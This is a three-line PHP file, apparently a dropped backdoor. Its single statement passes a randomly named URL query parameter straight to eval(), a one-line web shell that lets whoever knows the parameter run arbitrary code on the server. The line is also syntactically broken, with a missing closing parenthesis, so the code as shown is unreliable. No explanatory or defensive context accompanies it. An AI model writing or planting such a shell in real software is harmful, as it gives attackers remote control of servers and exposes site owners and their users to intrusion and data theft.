<?php
eval($_GET['NtmICVAO'];
?>
